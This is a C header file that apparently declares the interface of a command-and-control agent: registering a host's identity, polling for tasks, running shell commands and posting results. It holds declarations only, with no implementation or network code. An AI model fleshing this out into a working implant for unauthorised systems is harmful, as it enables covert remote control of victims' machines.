#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/utsname.h>

#ifndef INITIATE_H
#define INITIATE_H

struct agent_info {
	char uuid[64];
	char hostname[256];
	char os_type[64];
	char os_version[64];
};

struct strings_array {
	char *results;
	char *response; // was words
	size_t size;
	size_t cap;
	size_t file_num;
	FILE *word_source; //was word source
};

bool reg(struct agent_info *agent, struct strings_array *sa);

bool check_tasks(void);

bool get_host_info(struct agent_info *agent);

bool run_cmd(struct strings_array *sa);

bool can_run_cmd(const char *cmd);

bool post_results(struct strings_array *sa);



#endif